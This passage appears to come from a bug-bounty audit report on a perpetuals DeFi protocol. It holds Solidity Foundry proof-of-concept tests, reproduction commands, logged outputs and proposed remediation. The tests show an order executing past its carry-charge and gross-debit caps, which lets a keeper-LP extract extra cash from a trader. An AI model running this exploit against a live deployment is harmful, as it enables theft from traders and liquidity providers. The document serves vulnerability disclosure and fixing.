        result.treasuryCustody = clearinghouse.balanceAssets(engine.protocolTreasury());
        result.poolCash = settlementToken.balanceOf(address(pool));
        (result.positionSize,,,,,,) = engine.positions(TRADER);
        result.bobClaimAssets = juniorVault.convertToAssets(juniorVault.balanceOf(LP));
        result.seedJuniorClaimAssets = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        result.seedSeniorClaimAssets = seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    function _request(uint256 actionCap, uint256 grossCap) private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("carry-one-atom-threshold");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = 10_000e18;
        request.marginDelta = 1_000e6;
        request.targetPrice = 1e8;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: grossCap,
            maxActionChargeAssets: actionCap,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }
}

~~~

### Test 3 — Bob cashout and Alice's later full close

Save as: `packages/perps/test/perps/audit/AuditCarryLpCashout.t.sol`. This test includes the autonomous full LP exit and the separate same-mark public close initiated by Alice, with final balances for Alice, Bob, Carol, pool and treasury.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PerpsViewTypes} from "@plether/perps/interfaces/PerpsViewTypes.sol";

contract AuditCarryLpCashout is BasePerpTest {
    address private constant ALICE = address(0x111);
    address private constant BOB = address(0x222);
    address private constant CAROL = address(0x333);

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
    }

    struct Outcome {
        uint8 status;
        uint8 reason;
        uint256 sizeAfterExecute;
        uint256 traderCustodyAfterExecute;
        uint256 poolCashAfterExecute;
        uint256 treasuryAfterExecute;
        uint256 keeperBountyCustodyAfterExecute;
        uint256 lpClaimAfterExecute;
        uint256 traderCustodyAfterPublicClose;
        uint256 poolCashAfterPublicClose;
        uint256 treasuryAfterPublicClose;
        uint256 carolLpClaimAfterPublicClose;
        uint256 paidRedeemAssets;
        uint256 walletAfterClaim;
        uint256 remainingLpClaimAfterClaim;
        uint256 keeperCustodyAfterClaim;
        uint256 traderCustodyAfterClaim;
        uint256 positionSizeAfterClaim;
        uint256 poolCashAfterClaim;
        uint256 treasuryAfterClaim;
        uint256 carolLpClaimAfterClaim;
        uint256 aliceMarginAfterClaim;
        uint256 aliceLockedMarginAfterClaim;
        uint256 aliceVpiReserveAfterClaim;
        uint256 aliceEquityAfterClaim;
        int256 aliceUnrealizedPnlAfterClaim;
        int256 aliceVpiAccruedAfterClaim;
    }

    function test_RealizedLpCashoutAtSameMark() public {
        _fundJunior(BOB, 1_000_000e6);
        _fundTrader(ALICE, 100_000e6);
        _open(ALICE, CfdTypes.Side.LONG, 50_000e18, 10_000e6, 1e8);
        vm.warp(vm.getBlockTimestamp() + 1 days);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        assertEq(_expectedIndexedCarryAssets(ALICE), 219630);

        uint256 sharesToRedeem = juniorVault.balanceOf(BOB) * 8 / 10;
        uint256 bobWalletBefore = settlementToken.balanceOf(BOB);
        uint256 snapshot = vm.snapshotState();
        Outcome memory rejected = _run(9_488_954, sharesToRedeem, false);
        assertEq(rejected.status, uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(rejected.reason, uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(rejected.sizeAfterExecute, 50_000e18);

        assertTrue(vm.revertToState(snapshot));
        Outcome memory executed = _run(9_488_955, sharesToRedeem, false);
        assertEq(executed.status, uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(executed.reason, uint8(OrderV3Types.TerminalReason.Executed));
        assertEq(executed.sizeAfterExecute, 60_000e18);
        assertEq(executed.positionSizeAfterClaim, 60_000e18);
        assertGt(executed.paidRedeemAssets, rejected.paidRedeemAssets);
        assertEq(executed.keeperCustodyAfterClaim, rejected.keeperCustodyAfterClaim);

        emit log_named_uint("bob initial stake", 1_000_000e6);
        emit log_named_uint("bob initial wallet", bobWalletBefore);
        emit log_named_uint("rejected bob redeem payout", rejected.paidRedeemAssets);
        emit log_named_uint("executed bob redeem payout", executed.paidRedeemAssets);
        emit log_named_uint("incremental realized LP payout", executed.paidRedeemAssets - rejected.paidRedeemAssets);
        emit log_named_uint("rejected bob wallet after claim", rejected.walletAfterClaim);
        emit log_named_uint("executed bob wallet after claim", executed.walletAfterClaim);
        emit log_named_uint("rejected residual LP claim", rejected.remainingLpClaimAfterClaim);
        emit log_named_uint("executed residual LP claim", executed.remainingLpClaimAfterClaim);
        emit log_named_uint("rejected keeper bounty custody", rejected.keeperCustodyAfterClaim);
        emit log_named_uint("executed keeper bounty custody", executed.keeperCustodyAfterClaim);
        emit log_named_uint("rejected total bob assets wallet plus LP plus bounty", rejected.walletAfterClaim + rejected.remainingLpClaimAfterClaim + rejected.keeperCustodyAfterClaim);
        emit log_named_uint("executed total bob assets wallet plus LP plus bounty", executed.walletAfterClaim + executed.remainingLpClaimAfterClaim + executed.keeperCustodyAfterClaim);
        emit log_named_uint("trader custody rejected after execute", rejected.traderCustodyAfterExecute);
        emit log_named_uint("trader custody executed after execute", executed.traderCustodyAfterExecute);
        emit log_named_uint("trader custody rejected after claim", rejected.traderCustodyAfterClaim);
        emit log_named_uint("trader custody executed after claim", executed.traderCustodyAfterClaim);
        emit log_named_uint("pool cash rejected after claim", rejected.poolCashAfterClaim);
        emit log_named_uint("pool cash executed after claim", executed.poolCashAfterClaim);
        emit log_named_uint("treasury rejected after claim", rejected.treasuryAfterClaim);
        emit log_named_uint("treasury executed after claim", executed.treasuryAfterClaim);
    }

    function test_FullCashoutWithOtherLpDepthAtSameMark() public {
        _fundJunior(CAROL, 900_000e6);
        _fundJunior(BOB, 100_000e6);
        _fundTrader(ALICE, 100_000e6);
        _open(ALICE, CfdTypes.Side.LONG, 50_000e18, 10_000e6, 1e8);
        vm.warp(vm.getBlockTimestamp() + 1 days);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        assertEq(_expectedIndexedCarryAssets(ALICE), 219630);

        uint256 bobShares = juniorVault.balanceOf(BOB);
        uint256 snapshot = vm.snapshotState();
        Outcome memory rejected = _run(9_488_954, bobShares, true);
        assertEq(rejected.status, uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(rejected.reason, uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(rejected.sizeAfterExecute, 50_000e18);
        assertEq(rejected.remainingLpClaimAfterClaim, 0);

        assertTrue(vm.revertToState(snapshot));
        Outcome memory executed = _run(9_488_955, bobShares, true);
        assertEq(executed.status, uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(executed.reason, uint8(OrderV3Types.TerminalReason.Executed));
        assertEq(executed.sizeAfterExecute, 60_000e18);
        assertEq(executed.positionSizeAfterClaim, 0);
        assertEq(rejected.positionSizeAfterClaim, 0);
        assertEq(executed.remainingLpClaimAfterClaim, 0);
        assertGt(executed.paidRedeemAssets, rejected.paidRedeemAssets);

        emit log_named_uint("bob initial stake full exit", 100_000e6);
        emit log_named_uint("carol initial stake", 900_000e6);
        emit log_named_uint("rejected full exit bob USDG payout", rejected.paidRedeemAssets);
        emit log_named_uint("executed full exit bob USDG payout", executed.paidRedeemAssets);
        emit log_named_uint("incremental realized full exit payout", executed.paidRedeemAssets - rejected.paidRedeemAssets);
        emit log_named_uint("rejected full exit bob wallet", rejected.walletAfterClaim);
        emit log_named_uint("executed full exit bob wallet", executed.walletAfterClaim);
        emit log_named_uint("rejected full exit bob residual LP claim", rejected.remainingLpClaimAfterClaim);
        emit log_named_uint("executed full exit bob residual LP claim", executed.remainingLpClaimAfterClaim);
        emit log_named_uint("rejected full exit keeper custody", rejected.keeperCustodyAfterClaim);
        emit log_named_uint("executed full exit keeper custody", executed.keeperCustodyAfterClaim);
        emit log_named_uint("rejected full exit trader custody after public close", rejected.traderCustodyAfterPublicClose);
        emit log_named_uint("executed full exit trader custody after public close", executed.traderCustodyAfterPublicClose);
        emit log_named_uint("rejected full exit Carol LP claim after close", rejected.carolLpClaimAfterPublicClose);
        emit log_named_uint("executed full exit Carol LP claim after close", executed.carolLpClaimAfterPublicClose);
        emit log_named_uint("rejected full exit Carol LP claim after Bob exits", rejected.carolLpClaimAfterClaim);
        emit log_named_uint("executed full exit Carol LP claim after Bob exits", executed.carolLpClaimAfterClaim);
        emit log_named_uint("rejected full exit trader custody", rejected.traderCustodyAfterClaim);
        emit log_named_uint("executed full exit trader custody", executed.traderCustodyAfterClaim);
        emit log_named_uint("rejected full exit pool cash", rejected.poolCashAfterClaim);
        emit log_named_uint("executed full exit pool cash", executed.poolCashAfterClaim);
        emit log_named_uint("rejected full exit treasury", rejected.treasuryAfterClaim);
        emit log_named_uint("executed full exit treasury", executed.treasuryAfterClaim);
    }

    function test_FullCashoutWithoutVoluntaryCloseAtSameMark() public {
        _fundJunior(CAROL, 900_000e6);
        _fundJunior(BOB, 100_000e6);
        _fundTrader(ALICE, 100_000e6);
        _open(ALICE, CfdTypes.Side.LONG, 50_000e18, 10_000e6, 1e8);
        vm.warp(vm.getBlockTimestamp() + 1 days);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        assertEq(_expectedIndexedCarryAssets(ALICE), 219630);

        uint256 bobShares = juniorVault.balanceOf(BOB);
        uint256 snapshot = vm.snapshotState();
        Outcome memory rejected = _run(9_488_954, bobShares, false);
        assertEq(rejected.status, uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(rejected.positionSizeAfterClaim, 50_000e18);
        assertEq(rejected.remainingLpClaimAfterClaim, 0);

        assertTrue(vm.revertToState(snapshot));
        Outcome memory executed = _run(9_488_955, bobShares, false);
        assertEq(executed.status, uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(executed.positionSizeAfterClaim, 60_000e18);
        assertEq(executed.remainingLpClaimAfterClaim, 0);
        assertGt(executed.paidRedeemAssets, rejected.paidRedeemAssets);
        assertEq(rejected.aliceUnrealizedPnlAfterClaim, 0);
        assertEq(executed.aliceUnrealizedPnlAfterClaim, 0);

        emit log_named_uint("no-close Bob stake", 100_000e6);
        emit log_named_uint("no-close Carol stake", 900_000e6);
        emit log_named_uint("no-close Bob control wallet", rejected.walletAfterClaim);
        emit log_named_uint("no-close Bob bypass wallet", executed.walletAfterClaim);
        emit log_named_uint("no-close Bob realized incremental payout", executed.walletAfterClaim - rejected.walletAfterClaim);
        emit log_named_uint("no-close Bob control keeper custody", rejected.keeperCustodyAfterClaim);
        emit log_named_uint("no-close Bob bypass keeper custody", executed.keeperCustodyAfterClaim);
        emit log_named_uint("no-close Alice control custody", rejected.traderCustodyAfterClaim);
        emit log_named_uint("no-close Alice bypass custody", executed.traderCustodyAfterClaim);
        emit log_named_uint("no-close Alice control equity", rejected.aliceEquityAfterClaim);
        emit log_named_uint("no-close Alice bypass equity", executed.aliceEquityAfterClaim);
        emit log_named_uint("no-close Alice control position margin", rejected.aliceMarginAfterClaim);
        emit log_named_uint("no-close Alice bypass position margin", executed.aliceMarginAfterClaim);
        emit log_named_uint("no-close Alice control total locked margin", rejected.aliceLockedMarginAfterClaim);
        emit log_named_uint("no-close Alice bypass total locked margin", executed.aliceLockedMarginAfterClaim);
        emit log_named_uint("no-close Alice control VPI reserve", rejected.aliceVpiReserveAfterClaim);
        emit log_named_uint("no-close Alice bypass VPI reserve", executed.aliceVpiReserveAfterClaim);
        emit log_named_int("no-close Alice control unrealized PnL", rejected.aliceUnrealizedPnlAfterClaim);
        emit log_named_int("no-close Alice bypass unrealized PnL", executed.aliceUnrealizedPnlAfterClaim);
        emit log_named_int("no-close Alice control lifetime VPI", rejected.aliceVpiAccruedAfterClaim);
        emit log_named_int("no-close Alice bypass lifetime VPI", executed.aliceVpiAccruedAfterClaim);
        emit log_named_uint("no-close Carol control LP claim", rejected.carolLpClaimAfterClaim);
        emit log_named_uint("no-close Carol bypass LP claim", executed.carolLpClaimAfterClaim);
        emit log_named_uint("no-close pool control cash", rejected.poolCashAfterClaim);
        emit log_named_uint("no-close pool bypass cash", executed.poolCashAfterClaim);
        emit log_named_uint("no-close treasury control", rejected.treasuryAfterClaim);
        emit log_named_uint("no-close treasury bypass", executed.treasuryAfterClaim);
    }

    function _run(uint256 maxActionChargeAssets, uint256 sharesToRedeem, bool closeBeforeRedeem) private returns (Outcome memory out) {
        OrderV3Types.OrderRequest memory request = _request(maxActionChargeAssets);
        vm.prank(ALICE);
        uint64 id = router.commitOrder(request);
        assertEq(router.lifecycleBook().pendingIntent(id).commitment.carryCollectedAssets, 0);
        bytes[] memory executePriceData = _mockPythUpdateData(1e8);
        vm.prank(BOB);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, executePriceData);
        out.status = uint8(result.status);
        out.reason = uint8(router.lifecycleBook().terminalOutcome(id).reason);
        (out.sizeAfterExecute,,,,,,) = engine.positions(ALICE);
        out.traderCustodyAfterExecute = clearinghouse.balanceAssets(ALICE);
        out.poolCashAfterExecute = pool.totalAssets();
        out.treasuryAfterExecute = clearinghouse.balanceAssets(engine.protocolTreasury());
        out.keeperBountyCustodyAfterExecute = clearinghouse.balanceAssets(BOB);
        out.lpClaimAfterExecute = juniorVault.convertToAssets(juniorVault.balanceOf(BOB));

        if (closeBeforeRedeem) {
            vm.warp(vm.getBlockTimestamp() + 1);
            router.updateMarkPrice(_mockPythUpdateData(1e8));
            OrderV3Types.OrderRequest memory closeRequest = _closeRequest(out.sizeAfterExecute);
            vm.prank(ALICE);
            uint64 closeId = router.commitOrder(closeRequest);
            bytes[] memory closePriceData = _mockPythUpdateData(1e8);
            vm.prank(BOB);
            OrderV3Types.ExecutionResult memory closeExecution = router.executeOrder(closeId, closePriceData);
            assertEq(uint8(closeExecution.status), uint8(OrderV3Types.LifecycleStatus.Executed));
            out.traderCustodyAfterPublicClose = clearinghouse.balanceAssets(ALICE);
            out.poolCashAfterPublicClose = pool.totalAssets();
            out.treasuryAfterPublicClose = clearinghouse.balanceAssets(engine.protocolTreasury());
            out.carolLpClaimAfterPublicClose = juniorVault.convertToAssets(juniorVault.balanceOf(CAROL));
        }

        vm.prank(BOB);
        uint256 redeemId = juniorVault.requestRedeem(sharesToRedeem, BOB, BOB);
        vm.warp(pool.lpEpochStart(redeemId));
        bytes[] memory settlePriceData = _mockPythUpdateData(1e8);
        vm.prank(BOB);
        router.settleLpEpoch(settlePriceData);
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, BOB);
        assertEq(claimable, sharesToRedeem);
        vm.prank(BOB);
        out.paidRedeemAssets = juniorVault.claimRedeem(redeemId, claimable, BOB, BOB);
        out.walletAfterClaim = settlementToken.balanceOf(BOB);
        out.remainingLpClaimAfterClaim = juniorVault.convertToAssets(juniorVault.balanceOf(BOB));
        out.keeperCustodyAfterClaim = clearinghouse.balanceAssets(BOB);
        out.traderCustodyAfterClaim = clearinghouse.balanceAssets(ALICE);
        (out.positionSizeAfterClaim, out.aliceMarginAfterClaim,,,,, out.aliceVpiAccruedAfterClaim) = engine.positions(ALICE);
        out.aliceLockedMarginAfterClaim = clearinghouse.lockedMarginAssets(ALICE);
        out.aliceVpiReserveAfterClaim = clearinghouse.vpiRebateReserveAssets(ALICE);
        out.aliceEquityAfterClaim = publicLens.getTraderAccount(ALICE).equityAssets;
        PerpsViewTypes.PositionView memory alicePositionView = publicLens.getPosition(ALICE);
        out.aliceUnrealizedPnlAfterClaim = alicePositionView.unrealizedPnlAssets;
        out.poolCashAfterClaim = pool.totalAssets();
        out.treasuryAfterClaim = clearinghouse.balanceAssets(engine.protocolTreasury());
        out.carolLpClaimAfterClaim = juniorVault.convertToAssets(juniorVault.balanceOf(CAROL));
    }

    function _request(uint256 maxActionChargeAssets) private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("audit-carry-lp-cashout");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = 10_000e18;
        request.marginDelta = 1_000e6;
        request.targetPrice = 1e8;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: maxActionChargeAssets,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _closeRequest(uint256 size) private view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("audit-carry-cashout-public-close");
        request.side = CfdTypes.Side.LONG;
        request.isClose = true;
        request.sizeDelta = size;
        request.marginDelta = 0;
        request.targetPrice = 1e8;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }
}
~~~

### Reproduction

In a clean checkout of commit a82d4fefb02768e5b3bddcc97dee371eee24fea8, create the test directory from the checkout root:

~~~sh
mkdir -p packages/perps/test/perps/audit
~~~

Save the three Solidity blocks above verbatim under their exact filenames. Then run the tests from the checkout root:

~~~sh
test -f packages/perps/test/perps/audit/AuditCarryPublicE2E.t.sol
test -f packages/perps/test/perps/audit/AuditCarryOneAtomThreshold.t.sol
test -f packages/perps/test/perps/audit/AuditCarryLpCashout.t.sol
forge test --root packages/perps --match-path test/perps/audit/AuditCarryPublicE2E.t.sol --offline -vv
forge test --root packages/perps --match-path test/perps/audit/AuditCarryOneAtomThreshold.t.sol --offline -vv
forge test --root packages/perps --match-path test/perps/audit/AuditCarryLpCashout.t.sol --offline -vv
~~~

The first suite proves the public action path and measures Bob's cash payout at three simulated depths. The second proves the one-atom action and gross bound controls. The third closes Alice's position in an additional Alice-authored order and reconciles the final transfer. Price blobs are built before `vm.prank(BOB)`, so Bob is the actual caller of public `executeOrder` and `settleLpEpoch`.

### Observed output — public-entrypoint E2E, 3/3 PASS

The run produced the following output in six-decimal USDG atoms. Its 1× old carry is 0.219632, two atoms above the one-atom test's 0.219630 because the public initial-open sequence has different timing. These figures must not be combined as one branch.

~~~text
Ran 3 tests for test/perps/audit/AuditCarryPublicE2E.t.sol:AuditCarryPublicE2E
[PASS] test_HundredXPublicInitialOpenIncreaseAndFullLpCashout() (gas: 19988748)
Logs:
  scale: 100
  old carry: 21963267
  preview invalid reason: 0
  post-commit one-second carry: 254
  pre-commit trade cost: 949982005
  reported action charge: 949982259
  preview VPI charge: 549982005
  preview execution fee: 400000000
  Bob LP stake: 10000000000000
  Carol LP stake: 90000000000000
  Bob control wallet after full cashout: 10000127169723
  Bob bypass wallet after full cashout: 10000182167399
  Bob incremental realized wallet: 54997676
  Bob control keeper custody: 400000
  Bob bypass keeper custody: 400000
  Alice control custody: 9996727661733
  Alice bypass custody: 9995777679474
  Carol control LP claim preview: 90001144518381
  Carol bypass LP claim preview: 90001639497464
  pool control cash: 90003144768544
  pool bypass cash: 90003639753127
  treasury control custody: 2000000000
  treasury bypass custody: 2400000000

[PASS] test_OneXPublicInitialOpenIncreaseAndFullLpCashout() (gas: 19988440)
Logs:
  scale: 1
  old carry: 219632
  preview invalid reason: 0
  post-commit one-second carry: 2
  pre-commit trade cost: 9488953
  reported action charge: 9488955
  preview VPI charge: 5488953
  preview execution fee: 4000000
  Bob LP stake: 100000000000
  Carol LP stake: 900000000000
  Bob control wallet after full cashout: 100001245391
  Bob bypass wallet after full cashout: 100001793738
  Bob incremental realized wallet: 548347
  Bob control keeper custody: 400000
  Bob bypass keeper custody: 400000
  Alice control custody: 99966905319
  Alice bypass custody: 99957416364
  Carol control LP claim preview: 900011199400
  Carol bypass LP claim preview: 900016134524
  pool control cash: 902011449290
  pool bypass cash: 902016389898
  treasury control custody: 20000000
  treasury bypass custody: 24000000

[PASS] test_TenXPublicInitialOpenIncreaseAndFullLpCashout() (gas: 19994221)
Logs:
  scale: 10
  old carry: 2196326
  preview invalid reason: 0
  post-commit one-second carry: 25
  pre-commit trade cost: 94988303
  reported action charge: 94988328
  preview VPI charge: 54988303
  preview execution fee: 40000000
  Bob LP stake: 1000000000000
  Carol LP stake: 9000000000000
  Bob control wallet after full cashout: 1000012693032
  Bob bypass wallet after full cashout: 1000018191315
  Bob incremental realized wallet: 5498283
  Bob control keeper custody: 400000
  Bob bypass keeper custody: 400000
  Alice control custody: 999672428670
  Alice bypass custody: 999577440342
  Carol control LP claim preview: 9000114228160
  Carol bypass LP claim preview: 9000163712706
  pool control cash: 9002114478298
  pool bypass cash: 9002163968343
  treasury control custody: 200000000
  treasury bypass custody: 240000000

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 39.78ms (63.72ms CPU time)

Ran 1 test suite in 52.58ms (39.78ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
~~~

### Observed output — action and gross-debit bounds, 1/1 PASS

~~~text
Ran 1 test for test/perps/audit/AuditCarryOneAtomThreshold.t.sol:AuditCarryOneAtomThreshold
[PASS] test_OneAtomCapDifferenceExecutesOverBudgetIncrease() (gas: 19828127)
Logs:
  carry owed before both commits: 219630
  failed bound: 9488954
  executed bound: 9488955
  failed gross bound: 9688954
  executed gross bound: 9688955
  gross actual trader debit: 9908585
  trader custody rejected: 99967105321
  trader custody executed: 99957616366
  pool rejected: 1002012694679
  pool executed: 1002018183634
  treasury rejected: 20000000
  treasury executed: 24000000
  keeper rejected: 200000
  keeper executed: 200000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.15ms (15.09ms CPU time)

Ran 1 test suite in 28.94ms (21.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
~~~

### Observed output — cashout and same-mark public close, 3/3 PASS

~~~text
Ran 3 tests for test/perps/audit/AuditCarryLpCashout.t.sol:AuditCarryLpCashout
[PASS] test_FullCashoutWithOtherLpDepthAtSameMark() (gas: 21919966)
Logs:
  bob initial stake full exit: 100000000000
  carol initial stake: 900000000000
  rejected full exit bob USDG payout: 100001245391
  executed full exit bob USDG payout: 100001793738
  incremental realized full exit payout: 548347
  rejected full exit bob wallet: 100001245391
  executed full exit bob wallet: 100001793738
  rejected full exit bob residual LP claim: 0
  executed full exit bob residual LP claim: 0
  rejected full exit keeper custody: 200000
  executed full exit keeper custody: 200000
  rejected full exit trader custody after public close: 99959580203
  executed full exit trader custody after public close: 99951580101
  rejected full exit Carol LP claim after close: 900011207607
  executed full exit Carol LP claim after close: 900016142733
  rejected full exit Carol LP claim after Bob exits: 900011199404
  executed full exit Carol LP claim after Bob exits: 900016134529
  rejected full exit trader custody: 99959580203
  executed full exit trader custody: 99951580101
  rejected full exit pool cash: 902011449297
  executed full exit pool cash: 902016389906
  rejected full exit treasury: 27525109
  executed full exit treasury: 30036255

[PASS] test_FullCashoutWithoutVoluntaryCloseAtSameMark() (gas: 17379127)
Logs:
  no-close Bob stake: 100000000000
  no-close Carol stake: 900000000000
  no-close Bob control wallet: 100001245390
  no-close Bob bypass wallet: 100001793737
  no-close Bob realized incremental payout: 548347
  no-close Bob control keeper custody: 200000
  no-close Bob bypass keeper custody: 200000
  no-close Alice control custody: 99967105321
  no-close Alice bypass custody: 99957616366
  no-close Alice control equity: 9917296168
  no-close Alice bypass equity: 10897802634
  no-close Alice control position margin: 9917305321
  no-close Alice bypass position margin: 10897816366
  no-close Alice control total locked margin: 9967305321
  no-close Alice bypass total locked margin: 10957816366
  no-close Alice control VPI reserve: 0
  no-close Alice bypass VPI reserve: 0
  no-close Alice control unrealized PnL: 0
  no-close Alice bypass unrealized PnL: 0
  no-close Alice control lifetime VPI: 12475049
  no-close Alice bypass lifetime VPI: 17964002
  no-close Carol control LP claim: 900011199396
  no-close Carol bypass LP claim: 900016134520
  no-close pool control cash: 902011449289
  no-close pool bypass cash: 902016389897
  no-close treasury control: 20000000
  no-close treasury bypass: 24000000

[PASS] test_RealizedLpCashoutAtSameMark() (gas: 16003467)
Logs:
  bob initial stake: 1000000000000
  bob initial wallet: 0
  rejected bob redeem payout: 800009963128
  executed bob redeem payout: 800014349905
  incremental realized LP payout: 4386777
  rejected bob wallet after claim: 800009963128
  executed bob wallet after claim: 800014349905
  rejected residual LP claim: 200002490782
  executed residual LP claim: 200003587476
  rejected keeper bounty custody: 200000
  executed keeper bounty custody: 200000
  rejected total bob assets wallet plus LP plus bounty: 1000012653910
  executed total bob assets wallet plus LP plus bounty: 1000018137381
  trader custody rejected after execute: 99967105321
  trader custody executed after execute: 99957616366
  trader custody rejected after claim: 99967105321
  trader custody executed after claim: 99957616366
  pool cash rejected after claim: 202002731551
  pool cash executed after claim: 202003833729
  treasury rejected after claim: 20000000
  treasury executed after claim: 24000000

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 35.67ms (52.34ms CPU time)

Ran 1 test suite in 47.55ms (35.67ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
~~~

## Remediation

1. Record the real commitment effects. Capture carry actually collected across the opening order's bounty and margin reservations. Pass that amount and reconciled before/after balances to `recordCommitment`, and make the Book compare the effects with Clearinghouse state.
2. Enforce the cumulative limits. At execution, add the recorded commitment carry exactly once before checking `maxActionChargeAssets` and `maxGrossAccountDebitAssets`, as the close path already does.
3. Keep settlement and receipts consistent. If commitment-time collection alone exceeds a cap, revert that commitment atomically. If execution would bring the combined total over a cap, mark the increase Failed; the legitimate carry collected in the earlier commitment transaction may remain, as it does in the rejection control. The authenticated terminal receipt must report the same collected total.

This is a proposed fix, not a verified shipped change.

### Regression tests

Run public `commitOrder` → `executeOrder` at the one-atom threshold for both caps and verify receipt/custody reconciliation. Add a zero-bounty case for the later margin-reservation checkpoint, protected opens and a genuinely within-cap increase. Those additional variants are recommended tests, not observations claimed from this PoC.

## Summary

In Perps v2.0.0 and the frozen competition commit, collecting old-position carry while committing an increase leaves that payment out of the order's stored effects and the opening execution check. A one-atom control proves an increase executes even though its total action charge is 9.708585 USDG against Alice's 9.488955 cap; the gross-debit cap fails by the same 0.219630. Bob, already a Junior LP and permissionless keeper, can execute the pending order and redeem all his shares for 0.548347 USDG more cash than in the rejection control, with no extra bounty. A later Alice-authored close at the same price leaves her flat and 8.000102 USDG worse off, with the final transfer reconciled. Separate public-entrypoint fixtures produce 5.498283 and 54.997676 USDG of additional Bob wallet cash at 10× and 100× simulated MockUSDG depth, while Alice remains open; they do not measure deployed liquidity. The bound failure produces a realized third-party payout and supports proposed Critical direct theft. Alice's independent actions and the ordinary treatment of opening VPI leave the severity classification open to Immunefi triage.
